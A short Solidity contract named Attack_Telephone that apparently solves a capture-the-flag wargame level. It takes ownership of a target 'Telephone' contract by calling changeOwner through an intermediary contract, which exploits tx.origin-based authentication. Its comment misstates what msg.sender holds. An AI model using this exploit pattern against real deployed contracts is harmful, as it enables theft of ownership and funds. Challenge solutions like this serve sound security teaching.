// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./itelephone.sol";

contract Attack_Telephone {
    ITelephone itelephone;
    address public owner;

    constructor(address _addr) {
        itelephone = ITelephone(_addr);
    }

    function change() public {
        // msg.sender is the smart contract address
        itelephone.changeOwner(msg.sender);
    }
}
